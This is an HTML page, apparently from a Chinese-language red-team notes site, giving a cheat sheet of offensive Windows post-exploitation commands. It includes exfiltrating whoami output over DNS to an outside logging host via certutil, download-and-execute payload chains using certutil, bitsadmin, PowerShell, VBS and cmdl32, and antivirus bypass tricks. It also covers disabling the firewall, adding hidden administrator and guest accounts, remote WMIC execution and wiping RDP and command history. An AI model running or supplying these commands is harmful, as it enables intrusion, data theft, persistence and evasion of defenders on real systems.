@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Windows技巧 - Share Docs</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u5e38\u7528CMD\u547d\u4ee4", url: "#_top", children: [
+          ]},
+          {title: "Windows\u7684\u672c\u5730\u547d\u4ee4\u6267\u884c", url: "#windows", children: [
+          ]},
+          {title: "\u73af\u5883\u4fe1\u606f\u641c\u96c6", url: "#_1", children: [
+          ]},
+          {title: "WMIC", url: "#wmic", children: [
+          ]},
+          {title: "\u5bc6\u7801\u641c\u96c6", url: "#_2", children: [
+              {title: "SauronEye", url: "#sauroneye" },
+              {title: "SharpDir", url: "#sharpdir" },
+          ]},
+          {title: "\u5173\u9632\u706b\u5899", url: "#_3", children: [
+          ]},
+          {title: "\u662f\u5426\u5f00\u542f\u4e86UAC", url: "#uac", children: [
+          ]},
+          {title: "\u547d\u4ee4DNS\u5916\u5e26", url: "#dns", children: [
+          ]},
+          {title: "RDP\u76f8\u5173", url: "#rdp", children: [
+              {title: "\u5f00\u542fRDP\u670d\u52a1", url: "#rdp_1" },
+              {title: "\u5bfb\u627eRDP\u7684\u8fde\u63a5\u8bb0\u5f55", url: "#rdp_2" },
+              {title: "Kali\u4e0b\u8fdeRDP", url: "#kalirdp" },
+              {title: "\u6e05\u9664RDP\u8bb0\u5f55", url: "#rdp_3" },
+          ]},
+          {title: "\u65b0\u5efa\u7528\u6237\u76f8\u5173", url: "#_4", children: [
+          ]},
+          {title: "\u4e0b\u8f7d\u6587\u4ef6", url: "#_5", children: [
+              {title: "Chromium\u5185\u6838\u6d4f\u89c8\u5668\u4e0b\u8f7d", url: "#chromium" },
+              {title: "smb\uff08\u4ec5UNC\uff09", url: "#smbunc" },
+              {title: "certutil", url: "#certutil" },
+              {title: "bitsadmin", url: "#bitsadmin" },
+              {title: "powershell", url: "#powershell" },
+              {title: "ftp", url: "#ftp" },
+              {title: "vbs", url: "#vbs" },
+              {title: "exe", url: "#exe" },
+              {title: "cmdl32", url: "#cmdl32" },
+          ]},
+          {title: "\u7f51\u7edc\u5185\u4e3b\u673a\u63a2\u6d4b", url: "#_6", children: [
+          ]},
+          {title: "\u5386\u53f2\u547d\u4ee4", url: "#_7", children: [
+          ]},
+          {title: "\u4e00\u952e\u67e5\u8be2\u65e5\u5fd7\u767b\u5f55\u4e8b\u4ef6", url: "#_8", children: [
+          ]},
+          {title: "\u4e00\u952e\u5f00\u542fsmb\u533f\u540d\u8bbf\u95ee", url: "#smb", children: [
+          ]},
+          {title: "\u8ba1\u7b97\u673a\u4f11\u7720", url: "#_9", children: [
+          ]},
+          {title: "\u5229\u7528workfolders\u6267\u884c\u7a0b\u5e8f", url: "#workfolders", children: [
+          ]},
+          {title: "AT\u8ba1\u5212\u4efb\u52a1", url: "#at", children: [
+          ]},
+          {title: "Powershell\u7684\u8fd0\u884c\u7b56\u7565\u53ca\u7ed5\u8fc7", url: "#powershell_1", children: [
+          ]},
+          {title: "\u67e5\u770bWindows PIPE", url: "#windows-pipe", children: [
+          ]},
+          {title: "RDP\u5207\u4f1a\u8bdd", url: "#rdp_4", children: [
+          ]},
+          {title: "\u6253\u5305\u89e3\u5305", url: "#_10", children: [
+          ]},
+          {title: "\u5b89\u5168\u65e5\u5fd7\u8def\u5f84", url: "#_11", children: [
+          ]},
+          {title: "Windows\u51ed\u636e-\u89e3DPAPI", url: "#windows-dpapi", children: [
+          ]},
+          {title: "\u4ee5\u6307\u5b9a\u7528\u6237\u6765\u6253\u5f00\u4e00\u4e2acmd", url: "#cmd_1", children: [
+          ]},
+          {title: "\u641c\u7d22\u5b57\u7b26\u4e32", url: "#_12", children: [
+          ]},
+          {title: "\u6267\u884c\u547d\u4ee4\u4e14\u4e0d\u56de\u663e", url: "#_13", children: [
+          ]},
+          {title: "\u6267\u884cPS\u6587\u4ef6", url: "#ps", children: [
+          ]},
+          {title: "\u679a\u4e3e\u533f\u540dwindows\u5171\u4eab", url: "#windows_1", children: [
+          ]},
+          {title: "xcopy", url: "#xcopy", children: [
+          ]},
+          {title: "Powershell\u5f39\u7a97", url: "#powershell_2", children: [
+          ]},
+          {title: "\u67e5\u8be2\u6587\u4ef6MD5", url: "#md5", children: [
+          ]},
+          {title: "\u67e5\u8be2360\u6838\u6676", url: "#360", children: [
+          ]},
+          {title: "Powershell\u5386\u53f2\u8bb0\u5f55", url: "#powershell_3", children: [
+          ]},
+          {title: "\u67e5\u770b\u6587\u4ef6MD5", url: "#md5_1", children: [
+          ]},
+          {title: "\u5404\u4e2a\u73af\u5883\u53d8\u91cf", url: "#_14", children: [
+          ]},
+          {title: "\u5b89\u5168\u65e5\u5fd7\u8def\u5f84", url: "#_15", children: [
+          ]},
+          {title: "\u5f39\u7a97", url: "#_16", children: [
+          ]},
+          {title: "\u6301\u7eed\u622a\u5c4f", url: "#_17", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/" class="btn btn-xs btn-link">
+        trustedsec BOF插件说明文档
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-link">
+        Vcenter攻击面
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <hr />
+<p>title: Windows技巧 date: 2021-01-14 12:01:51</p>
+<hr />
+<p><em>信息搜集很重要</em></p>
+<h3 id="cmd">常用CMD命令</h3>
+<pre><code class="language-text-plain">whoami # 查看当前用户
+net user # 查看所有用户
+query user # 查看当前在线用户
+ipconfig /all # 查看当前主机的主机名/IP/DNS等信息
+route print # 查看路由表信息
+netstat -ano # 查看端口开放情况
+arp -a # 查看arp解析情况
+tasklist /svc # 查看进程及对应服务名
+net localgroup administrators # 查看管理员组成员
+systeminfo # 查看系统信息含补丁信息
+net use # 查看ipc连接情况
+net view # 查看匿名共享情况
+netsh firewall show state # 查看防火墙状态
+cmdkey /l # 查看当前保存的登陆凭证
+</code></pre>
+<h3 id="windows">Windows的本地命令执行</h3>
+<p>可用来替代cmd</p>
+<pre><code class="language-text-plain">forfiles /c c:\windows\system32\calc.exe    #无限运行
+pcalua.exe -a c:\windows\system32\calc.exe    
+powershell SyncAppvPublishingServer.vbs &quot;n; Start-Process c:\windows\system32\calc.exe&quot;
+cmd.exe /c &quot;ping 127.0.0.1/../../../../../../../windows/system32/calc.exe&quot;
+conhost C:\Windows\System32\calc.exe
+explorer.exe C:\Users\keefe\desktop\1.exe
+</code></pre>
+<h3 id="_1">环境信息搜集</h3>
+<pre><code class="language-text-plain">- nbtscan.exe xx.xx.xx.xx/24 # 查看c段机器
+- csvde.exe -f 1.csv -k # 批量导入/导出AD用户
+- setspn.exe -T xx.xx.xx.xx -Q */* # 查看当前域内所有spn
+- netstat -ano  
+</code></pre>
+<h3 id="wmic">WMIC</h3>
+<p>获取所有命名空间的类</p>
+<p><code>Get-WmiObject -Namespace root\directory\ldap -Class * -List</code></p>
+<p>获取类的详细参数</p>
+<p><code>Get-WmiObject -Namespace root\directory\ldap -Class * -List | select -ExpandProperty Properties |select name,Origin</code></p>
+<p>获取指定类的详细参数</p>
+<p><code>Get-WmiObject -Namespace root\directory\ldap -List -classname "ds_dnszone"| select -ExpandProperty Properties |select name,Origin</code></p>
+<p>获取指定类的所有数据</p>
+<p><code>Get-WmiObject -Namespace root\directory\ldap -Class ds_dnszone</code></p>
+<p>使用<code>/Namespace</code>指定命名空间，使用<code>/node</code>、<code>/user</code>、<code>/password</code>来远程运行，使用<code>path</code>来调用win32类。</p>
+<p><a href="https://docs.microsoft.com/zh-cn/windows/win32/cimwin32prov/cimwin32-wmi-providers">CIMWin32 WMI 提供程序 - Win32 apps | Microsoft Docs</a></p>
+<pre><code class="language-text-plain">查程序路径
+wmic process where name='xx.exe' get ExecutablePath
+wmic Process get name,ExecutablePath,ProcessId
+查杀毒
+wmic /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+查域控
+wmic /Namespace:\\root\directory\ldap path ds_computer where ds_useraccountcontrol=532480 get ds_cn,ds_useraccountcontrol,ds_dnshostname,ds_operatingsystem
+查域内所有机器
+wmic /Namespace:\\root\directory\ldap path ds_computer get ds_cn,ds_useraccountcontrol,ds_dnshostname,ds_operatingsystem
+查询域的DN
+wmic /Namespace:\\root\directory\ldap path ds_domain get ds_distinguishedname,ds_dc
+查询计算机用户
+wmic UserAccount
+wmic useraccount get name,sid
+查询BIOS-用来判断虚拟机
+wmic BIOS
+使用path调用win32类
+wmic path Win32_bios
+查看当前磁盘
+wmic path Win32_LogicalDisk get Caption,VolumeName
+ping一个地址，通过对比发送包和返回包的大小判断是否成功
+wmic path Win32_PingStatus where Address=&quot;192.168.14.100&quot; get BufferSize,ReplySize,Timeout
+查看IP地址相关信息
+wmic path Win32_NetworkAdapterConfiguration get IPAddress,DefaultIPGateway,IPSubnet,DNSHostName,DNSDomain,MACAddress
+结束进程
+wmic process where processid=&quot;2345&quot; delete
+远程运行程序
+wmic /node:10.130.7.75 /user:exp1\administrator /password:xxxx process call create c:\360edr.exe
+用list查看是否运行成功
+wmic /node:10.130.7.75 /user:exp1\administrator /password:xxxx process where name=&quot;chrome.exe&quot; get executablepath
+查看磁盘
+wmic logicaldisk get caption,description,drivetype,providername
+
+远程执行
+wmic /node:192.168.17.138 /user:test /password:!@#123QWE process call create c:\programdata\test.bat
+
+wmic /node:10.130.7.75 /user:123\administrator /password:123123 process call create c:\360edr.exe
+
+wmic /node:192.168.17.138 process call create c:\windows\system32\cmd.exe /c ipconfig &gt; c:\1.txt
+
+&gt;wmic OS get Caption,CSDVersion,OSArchitecture,Version系统版本
+&gt;wmic service list brief 列出本机服务
+&gt;wmic process list brief 列出进程
+&gt;wmic process where name=&quot;chrome.exe&quot; get executablepath进程路径
+&gt;wmic process get caption,commandline /value&gt;&gt;1.txt查询所有进程参数
+&gt;wmic process where caption=&quot;svchost.exe&quot; get caption,commandline /value 查询某个进程命令行参数
+创建进程
+&gt;wmic process call create calc
+&gt;wmic process call create &quot;C:\shell.exe&quot;
+&gt;wmic process call create &quot;shutdown.exe -r -f -t 20&quot;
+结束进程
+&gt;wmic process where name=&quot;shell.exe&quot; call terminate
+&gt;wmic process where processid=&quot;2345&quot; delete
+&gt;wmic process 2345 call terminate
+&gt;wmic startup list brief 列出自启动程序
+&gt;wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 查看杀毒软件
+&gt;wmic netuse list brief 列出共享驱动盘
+&gt;wmic ntdomain list brief 查询域控制器
+&gt;wmic useraccount list brief 列出本机管理员及SID
+&gt;wmic qfe list brief 列出补丁列表
+&gt;wmic share get name,path 查看共享
+&gt;wmic startup list brief查看启动项
+&gt;wmic product get name,version 查看安装的软件
+&gt;wmic product where &quot;name like '%360%'&quot; get name 查看程序名
+&gt;wmic product where name=&quot;360tray&quot; call uninstall 卸载程序
+&gt;wmic process where &quot;name like '%360%'&quot; get name 查找进程全名
+&gt;wmic product where name=&quot;360tray.exe&quot; call terminate 停止程序
+&gt;wmic desktop get screensaversecure,screensavertimeout 查看屏保
+
+
+查杀软  
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+
+查系统版本  
+wmic OS  
+wmic OS get Caption,CSName
+
+查程序  
+wmic product get name,version
+
+当前登录用户  
+quser
+
+安装的程序  
+wmic product get name,version
+
+开远程连接端⼝  
+server 2003 &amp; XP  
+wmic path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1  
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+server2008/7/2012  
+wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call set allowtsconnections 1  
+wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call  
+setuserauthenticationrequired 1  
+reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f  
+7和2012只需要前两条即可
+</code></pre>
+<h3 id="_2">密码搜集</h3>
+<h4 id="sauroneye">SauronEye</h4>
+<p>sharpcollection</p>
+<p>快速搜索某后缀或内容的文件,速度真的很快.</p>
+<p>-f 指定后缀,-c指定内容</p>
+<pre><code class="language-text-plain">SauronEye.exe -f &quot;.txt &quot;.doc&quot; -c &quot;pass&quot;
+</code></pre>
+<p>搜索名字可以使用 dir /s /b c:\ | findstr 密码</p>
+<h4 id="sharpdir">SharpDir</h4>
+<p>sharpcollection</p>
+<p>可以本地或远程搜索</p>
+<h3 id="_3">关防火墙</h3>
+<pre><code class="language-text-plain">netsh firewall set opmode disable
+</code></pre>
+<h3 id="uac">是否开启了UAC</h3>
+<p>0x0 无UAC</p>
+<p>0x5 中防护</p>
+<p>0x2 高防护</p>
+<pre><code class="language-text-plain">REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+</code></pre>
+<h3 id="dns">命令DNS外带</h3>
+<pre><code class="language-text-plain">cmd /c &quot;whoami &gt; abcde &amp;&amp; set /p xx=&lt;abcde &amp;&amp; certutil -urlcache -split -f http://123.ceye.io?a=%xx%
+
+cmd /c /v &quot;whoami &gt; abcde &amp;&amp; set /p xx=&lt;abcde &amp;&amp; certutil -urlcache -split -f http://123.ceye.io?a=!xx!
+
+长命令编码后带出
+cmd /v /c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.xxx.ceye.io &amp;&amp; ping -n 1 !FINAL!&quot; &amp;&amp; del /F temp*
+
+命令编码
+ipconfig &gt; D:\temp &amp;&amp; certutil -encode D:\temp D:\temp3 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; D:\temp3 &gt; D:\temp4 &amp;&amp; type D:\temp4 &amp;&amp; del D:\temp*
+</code></pre>
+<h3 id="rdp">RDP相关</h3>
+<h4 id="rdp_1">开启RDP服务</h4>
+<pre><code class="language-text-plain">开启
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+查端口
+REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber
+</code></pre>
+<h4 id="rdp_2">寻找RDP的连接记录</h4>
+<p>直接运行</p>
+<pre><code class="language-text-plain">&lt;#
+.SYNOPSIS
+This script will list all users' RDP Connections History.
+First use &quot;reg load&quot; to load hive.
+Then read the RDP Connections History from HKEY_USERS.
+Last you need to use &quot;reg unload&quot; to unload hive. 
+The script automatically implements the above operation,there is no need for a GUI. :)
+Author: 3gstudent@3gstudent
+License: BSD 3-Clause
+#&gt;
+$AllUser = Get-WmiObject -Class Win32_UserAccount
+foreach($User in $AllUser)
+{
+    $RegPath = &quot;Registry::HKEY_USERS\&quot;+$User.SID+&quot;\Software\Microsoft\Terminal Server Client\Servers\&quot;
+    Write-Host &quot;User:&quot;$User.Name
+    Write-Host &quot;SID:&quot;$User.SID
+    Write-Host &quot;Status:&quot;$User.Status
+    $QueryPath = dir $RegPath -Name -ErrorAction SilentlyContinue
+    If(!$?)
+    {
+        Write-Host &quot;[!]Not logged in&quot;
+        Write-Host &quot;[*]Try to load Hive&quot;
+        $File = &quot;C:\Documents and Settings\&quot;+$User.Name+&quot;\NTUSER.DAT&quot;
+        $Path = &quot;HKEY_USERS\&quot;+$User.SID
+        Write-Host &quot;[+]Path:&quot;$Path 
+        Write-Host &quot;[+]File:&quot;$File
+        Reg load $Path $File
+        If(!$?)
+        {
+            Write-Host &quot;[!]Fail to load Hive&quot;
+            Write-Host &quot;[!]No RDP Connections History&quot;
+        }
+        Else
+        {
+            $QueryPath = dir $RegPath -Name -ErrorAction SilentlyContinue
+            If(!$?)
+            {
+                Write-Host &quot;[!]No RDP Connections History&quot;
+            }
+            Else
+            {
+                foreach($Name in $QueryPath)
+                {   
+                    $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint
+                    Write-Host &quot;Server:&quot;$Name
+                    Write-Host &quot;User:&quot;$User
+                }
+            }
+            Write-Host &quot;[*]Try to unload Hive&quot;
+            Start-Process powershell.exe -WindowStyle Hidden -ArgumentList &quot;Reg unload $Path&quot;        
+        }
+    }
+    foreach($Name in $QueryPath)
+    {   
+        Try  
+        {  
+            $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint
+            Write-Host &quot;Server:&quot;$Name
+            Write-Host &quot;User:&quot;$User
+        }
+        Catch  
+        {
+            Write-Host &quot;[!]No RDP Connections History&quot;
+        }
+    }
+    Write-Host &quot;----------------------------------&quot;    
+}
+</code></pre>
+<h4 id="kalirdp">Kali下连RDP</h4>
+<p>列两个比较好用的，kali自带的</p>
+<pre><code class="language-text-plain">xfreerdp /v:192.168.0.20:3389 /u:administrator /p:Huawei12#$ /cert-ignore /drive:share1,/tmp
+rdesktop 192.168.112.129 -u1 -pTest123! -r disk:share1=/tmp
+</code></pre>
+<h4 id="rdp_3">清除RDP记录</h4>
+<pre><code class="language-text-plain">@echo off
+@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f
+@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; /a
+@exit
+</code></pre>
+<h3 id="_4">新建用户相关</h3>
+<pre><code class="language-text-plain">net user test PasS@d123@pas /add
+
+加入管理员组
+net localgroup administrators test /add
+
+ 加入远程桌面用户组
+net localgroup &quot;remote desktop users&quot; test /add
+
+net user guest /active:yes &amp;&amp; net user guest Aa123456. &amp;&amp; net localgroup Administrators guest /add &amp;&amp; net localgroup &quot;Remote Desktop Users&quot; guest /add
+</code></pre>
+<h3 id="_5">下载文件</h3>
+<h4 id="chromium">Chromium内核浏览器下载</h4>
+<p>1.下载的文件需要编码</p>
+<p>2.下载的文件需要是html</p>
+<p>将文件编码后的内容放到HTML中，必须是独立行，否则后续会有问题</p>
+<pre><code class="language-text-plain">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;
+YXNmcXdmcXdmYWZhc2Zhc2Rhc2Rhc2Rhc2Q=
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<p>下载</p>
+<pre><code class="language-text-plain">&quot;C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe&quot; --headless --enable-logging --disable-gpu --dump-dom &quot;http://1.1.1.1:8991/1.html&quot; &gt; a.1
+</code></pre>
+<p>findstr排除html标签</p>
+<pre><code class="language-text-plain">findstr /v &quot;html&gt;&quot; a.1 &gt; a.2
+</code></pre>
+<p>certutil还原原始内容</p>
+<pre><code class="language-text-plain">certutil -decode a.2 a.3
+</code></pre>
+<h4 id="smbunc">smb（仅UNC）</h4>
+<pre><code class="language-text-plain">用impacket快速开启smb
+smbserver.py -smb2support share /tmp/1.exe    
+
+windows命令下载（需要停用禁止来宾访问的策略）
+Pcalua -a \\x.x.x.x\share\777.exe    //可以直接执行程序，但有UAC
+copy \\x.x.x.x\share\777.exe        //从UNC复制程序
+
+遇权限问题时可试下面的
+REG ADD &quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot; /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes
+REG ADD &quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot; /v NullSessionShares /t REG_MULTI_SZ /d share /f
+REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
+REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v RestrictAnonymous /t REG_DWORD /d 0 /f
+</code></pre>
+<h4 id="certutil">certutil</h4>
+<pre><code class="language-text-plain"> http://127.0.0.1:8000/1.txt C:\users\public\music\a&amp;echo [W]&amp;cd&amp;echo [Q]
+
+cmd /c certutil -urlcache -split -f http://x.x.x.x/%USERNAME%+%COMPUTERNAME%+%HOMEPATH%
+
+certutil -urlcache -split -f http://1.1.1.1:8080/ac.xml 1.xml
+
+certutil -urlcache -split -f http://1.1.1.1:7522/1.exe &quot;C:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\\1.exe&quot;
+
+下载dll，利用InstallUtil执行
+certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode
+payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
+
+下载并执行
+certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe
+
+certutil这个默认的存储位置是
+%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
+
+查看缓存项目：
+certutil.exe -urlcache *
+CertUtil -decode InFile OutFile
+
+bypass360（2021-7-19）：
+certutil -urlcache -split -f crl delete
+certutil -urlcache -split -f http://1.1.1.1:8000 a
+</code></pre>
+<p>使用特殊字符绕过</p>
+<pre><code class="language-text-plain">
+</code></pre>
+<p>使用unicode编码绕过</p>
+<h4 id="bitsadmin">bitsadmin</h4>
+<pre><code class="language-text-plain">bitsadmin /transfer myDownLoadJob /download /priority normal http://http://47.100.123.59:7522/1.exe c:\users\1a.exe
+</code></pre>
+<p>使用引号绕过</p>
+<pre><code class="language-text-plain">bitsadmin /&quot;t&quot;ransfer cc http://1.1.1.1:8000 %temp%\a.txt
+</code></pre>
+<h4 id="powershell">powershell</h4>
+<pre><code class="language-text-plain">powershell Start-BitsTransfer -Source &quot;http://10.0.2.21/pentestlab.exe&quot; -Destination &quot;C:\tmp\pentestlab.exe&quot;
+
+powershell &quot;Import-Module BitsTransfer;start-bitstransfer http://uee.me/crAJs cd.bat&quot;|cd.bat
+
+powershell (new-object System.Net.WebClient).DownloadFile('http://1.1.1.1:8000','c:\user\public\a');start-process 'c:\download\a.exe'
+
+powershell.exe iwr -uri 192.168.212.1:90/1 -o  x
+
+从UNC读取执行
+powershell -exec bypass -f \\webdavserver\folder\payload.ps1
+</code></pre>
+<h4 id="ftp">ftp</h4>
+<pre><code class="language-text-plain">python快速搭建ftp
+python -m pyftpdlib -i 0.0.0.0 -p 21 -d .
+
+特殊端口的下载命令
+(echo open 192.168.52.129 2121 &amp; echo get get-pip.py savexxx)| ftp -A @
+默认端口的下载命令
+echo get 1 save | ftp -A 192.168.212.1 # all works
+</code></pre>
+<h4 id="vbs">vbs</h4>
+<p>写入vbs文件，该文件唯一的功能就是下载</p>
+<pre><code class="language-text-plain">echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt; 1.vbs
+</code></pre>
+<p>cscript执行vbs</p>
+<pre><code class="language-text-plain">cscript 1.vbs http://192.168.52.129:8000/calc.exe calc.exe
+</code></pre>
+<h4 id="exe">exe</h4>
+<p>写C#代理，直接编译成exe，该exe唯一的功能就是下载</p>
+<pre><code class="language-text-plain">echo using System.Net;class WebDL { static void Main(string[] args){System.Net.WebClient client = new WebClient();client.DownloadFile(args[0],args[1]);}} &gt; 1.cs
+</code></pre>
+<p>csc编译</p>
+<pre><code class="language-text-plain">c:\windows\microsoft.net\framework\v4.0.30319\csc.exe 1.cs
+
+out参数指定输出目录
+c:\windows\microsoft.net\framework\v3.5\csc /out:c:\1.exe 1.cs
+</code></pre>
+<p>运行</p>
+<pre><code class="language-text-plain">1.exe http://192.168.52.129:8000/calc.exe calc.exe
+</code></pre>
+<h4 id="cmdl32">cmdl32</h4>
+<p>创建一个settings.txt配置文件</p>
+<pre><code>[Connection Manager]
+CMSFile=settings.txt
+Servicename=WindowsUpdate
+TunnelFile=settings.txt
+[Settings]
+UpdateUrl=http://x.x.x.x/x.exe
+</code></pre>
+<p>执行</p>
+<pre><code>cmdl32 /vpn /lan c:\settings.txt
+</code></pre>
+<p>下载完重命名</p>
+<h3 id="_6">网络内主机探测</h3>
+<p>改进了一下网上的脚本</p>
+<pre><code class="language-text-plain">rem a段探测
+@echo off
+
+rem 修改ip的值以指定a段
+
+setlocal enabledelayedexpansion
+
+set ip=10
+
+for /l %%i in (0,1,255) do (
+
+for /l %%k in (0,1,255) do (
+
+for %%j in (1,254) do ( @ping %ip%.%%i.%%k.%%j -w 1 -n 1|find /i &quot;ttl=&quot; &gt;&gt; null
+if !errorlevel! equ 0 (echo %ip%.%%i.%%k.%%j is alive ! &gt;&gt; ascan.txt ) else (echo %ip%.%%i.%%k.%%j May be not exist ! )
+)
+)
+)
+exit
+</code></pre>
+<pre><code class="language-text-plain">rem b段探测
+@echo off
+setlocal enabledelayedexpansion
+
+set ip=192.168
+
+for /l %%i in (0,1,255) do (
+
+for %%k in (1,254) do ( @ping %ip%.%%i.%%k -w 1 -n 1|find /i &quot;ttl=&quot; &gt;&gt; null
+if !errorlevel! equ 0 (echo %ip%.%%i.%%k is alive ! &gt;&gt; bscan.txt ) else (echo %ip%.%%i.%%k May be not exist ! )
+)
+)
+exit
+</code></pre>
+<pre><code class="language-text-plain">rem c段探测
+@echo off
+
+setlocal enabledelayedexpansion
+
+set ip=192.168.148
+
+for /l %%k in (0,1,254) do  (
+@ping %ip%.%%k -w 1 -n 1| findstr &quot;TTL=&quot; &gt;nul
+if !errorlevel! equ 0 (echo %ip%.%%k is alive ! &gt;&gt; cscan.txt ) else (echo %ip%.%%k May be not exist ! )
+)
+pause
+</code></pre>
+<h3 id="_7">历史命令</h3>
+<p>不管是powershell还是cmd，能够读取的历史命令仅限于当前窗口，当前窗口关闭后会自动清除，无法读取</p>
+<p>查看</p>
+<pre><code class="language-text-plain">cmd&gt;doskey /h
+poershell&gt;Get-History | Format-List -Property *
+</code></pre>
+<p>清空</p>
+<pre><code class="language-text-plain">cmd&gt;doskey /reinstall
+powershell&gt;Clear-History
+</code></pre>
+<h3 id="_8">一键查询日志登录事件</h3>
+<p>通过修改事件ID来查询不同登录事件</p>
+<pre><code class="language-text-plain">$Events = Get-WinEvent -LogName &quot;security&quot; -FilterXPath &quot;Event[System[(EventID=4624)] and EventData[Data[@Name='TargetUserName']='testb']]&quot;     
+ForEach ($Event in $Events) {       
+  $eventXML = [xml]$Event.ToXml()         
+  For ($i=0; $i -lt $eventXML.Event.EventData.Data.Count; $i++) {   
+    Add-Member -InputObject $Event -MemberType NoteProperty -Force -Name $eventXML.Event.EventData.Data[$i].name -Value $eventXML.Event.EventData.Data[$i].'#text'     
+  }       
+}       
+$events|select ipaddress
+</code></pre>
+<h3 id="smb">一键开启smb匿名访问</h3>
+<pre><code class="language-text-plain">mkdir C:\share
+icacls C:\share\ /T /grant Anonymous` logon:r
+icacls C:\share\ /T /grant Everyone:r
+New-SmbShare -Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'
+REG ADD &quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot; /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes
+REG ADD &quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot; /v NullSessionShares /t REG_MULTI_SZ /d share /f
